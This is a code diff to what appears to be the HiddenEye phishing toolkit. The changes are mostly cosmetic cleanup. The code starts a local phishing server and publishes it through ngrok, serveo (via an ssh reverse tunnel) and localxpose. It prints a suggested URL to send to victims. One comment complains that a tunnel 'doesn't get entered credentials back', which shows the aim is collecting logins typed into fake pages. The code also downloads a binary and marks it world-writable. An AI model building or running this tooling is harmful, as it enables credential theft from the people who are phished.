@@ -26,14 +26,6 @@ default_palette = theme.default_palette
 
 def server_selection(port):  # Question where user must select server
     run_command('clear')
-    # print('''
-    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-    #    {0}http://github.com/darksecdevelopers
-    #    {0}** BY:DARKSEC ** \n\n-------------------------------\n
-
-    # )
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
@@ -50,10 +42,10 @@ def server_selection(port):  # Question where user must select server
         start_ngrok(port)  # FIXED
     elif choice == '02':
         run_command('clear')
-        start_serveo(port)  # ALMOST FIXED
+        start_serveo(port)  # TODO ALMOST FIXED
     elif choice == '03':
         run_command('clear')
-        start_localxpose(port)  # DOESN'T GET ENTERED CREDENTIALS BACK
+        start_localxpose(port)  # TODO DOESN'T GET ENTERED CREDENTIALS BACK
     elif choice == '04':
         run_command('clear')
         start_localtunnel(port, True)
@@ -94,13 +86,13 @@ def start_localhost(port):
     host = "127.0.0.1"
     print(localization.lang_start_localhost["your_localhost_is"] + host)
     set_port()
- 
+
     enter_server_www
     set_php(host, port)
     print(localization.lang_start_localhost[
           "starting_server_on_addr"] + "{0}:{1}".format(host, port))
     run_command('clear')
-    
+
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
@@ -113,30 +105,20 @@ def start_localhost(port):
 
 
 def start_ngrok(port):
-    #ngrok.DEFAULT_CONFIG_PATH = ".config/ngrok.yml"
-    # ngrok_conf.DEFAULT_NGROK_CONFIG_PATH = ".config/ngrok.yml" # Prabably way to go, but i'm not sure yet...
-    
     ngrok_conf.PyngrokConfig(config_path=".config/ngrok.yml")
-   
     run_command(['killall', '-2', 'ngrok'], stdout=DEVNULL, stderr=DEVNULL)
     run_command('clear')
-   
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
     print(global_localization.line_of_dots)
     print(localization.lang_start_ngrok["ngrok_server"])
-  
     ngrok.connect(port=int(port))
-   
     while True:
         wait(2)
-       
         ngrok_tunnels = ngrok.get_tunnels()
         url = ngrok_tunnels[0].public_url
-       
         if regular_expression.match("https://[0-9a-z]*\.ngrok.io", url) is not None:
-            
             print(localization.lang_start_ngrok["send_this_url_suggestion"])
             print(localization.lang_start_localhost[
                   "localhost_url"] + '127.0.0.1:' + port)
@@ -154,7 +136,6 @@ def start_serveo(port):
 
     def random(port):
         run_command('clear')
-       
         print(global_localization.hidden_eye_logo)
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
@@ -168,7 +149,6 @@ def start_serveo(port):
             output = check_output(
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
-           
             print(localization.lang_start_serveo["send_this_url_suggestion"])
             print(localization.lang_start_localhost[
                   "localhost_url"] + '127.0.0.1:' + port)
@@ -181,7 +161,6 @@ def start_serveo(port):
             return random(port)
 
     def custom(port):
-       
         print(global_localization.hidden_eye_logo)
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
@@ -196,7 +175,6 @@ def start_serveo(port):
             lnk += ".serveo.net"
         else:
             pass
-       
         run_command(
             ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-o', 'ServerAliveCountMax=60',
              '-R', '{0}:80:localhost:{1}'.format(lnk, port), 'serveo.net', '>', 'link.url'], stdout=DEVNULL,
@@ -207,14 +185,11 @@ def start_serveo(port):
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
-            
             print(global_localization.hidden_eye_logo)
             print(global_localization.official_website_link)
             print(global_localization.by_darksec)
             print(global_localization.line_of_dots)
             print(localization.lang_start_serveo["serveo_custom_server"])
-
-            
             print(localization.lang_start_serveo["send_this_url_suggestion"])
             print(localization.lang_start_localhost[
                   "localhost_url"] + '127.0.0.1:' + port)
@@ -224,7 +199,6 @@ def start_serveo(port):
             print("\n")
 
         except CalledProcessError:
-           
             print(localization.lang_start_serveo["failed_to_get_domain"])
             print(localization.lang_start_serveo["suggestion_to_fix_issue"])
             print(localization.lang_start_serveo["you_can_try_to_select_other_domain"])
@@ -233,7 +207,6 @@ def start_serveo(port):
             return custom(port)
 
     if is_online:
-        
         print(global_localization.hidden_eye_logo)
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
@@ -241,8 +214,6 @@ def start_serveo(port):
         print(localization.lang_start_serveo["serveo_url_option_selection"])
         print(localization.lang_start_serveo["serveo_phishing_warning"])
         print(localization.lang_start_serveo["choose_type_of_url"])
-
-       
         print_sorted_as_menu(localization.lang_start_serveo["url_types"])
         choice = input(global_localization.input_line)
         run_command('clear')
@@ -255,7 +226,6 @@ def start_serveo(port):
             run_command('clear')
             return start_serveo(port)
     else:
-       
         print(localization.lang_start_serveo["serveo_is_down"])
         choice = input("HiddenEye >> ")
         choice = choice.lower()
@@ -268,7 +238,6 @@ def start_serveo(port):
 def start_localxpose(port):
     localxpose_file = "External_Software/loclx"
     localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
-    
     if path.isfile(localxpose_file):
         pass
     else:
@@ -276,35 +245,18 @@ def start_localxpose(port):
             localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-amd64.zip"
         elif simple_informant.check_platform("system") == "Linux" and simple_informant.check_platform("architecture" == "aarch64"):
             localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
-        
         with url_request.urlopen(localxpose_url) as loclxzip:
             with ZipFile(BytesIO(loclxzip.read())) as zip_file:
                 zip_file.extractall("External_Software")
         chmod('External_Software/loclx', 0o777)
-    
-   
-                    
     def random(port):
         run_command('clear')
-        #print('''
-        #{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        #|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        #|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        #{0}http://github.com/darksecdevelopers
-        
-        #{0}** BY:DARKSEC ** \n\n-------------------------------\
-            # n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(
-        #    default_palette[1], default_palette[2]))
         print(global_localization.hidden_eye_logo)
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
         print(global_localization.line_of_dots)
         print(localization.lang_start_localxpose["localxpose_random_server"])
-        #run_command(['Server/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL,
-        #          stderr=DEVNULL)
-        #wait(8)
         run_command(['External_Software/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
-        
         try:
             output = check_output(
                 "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
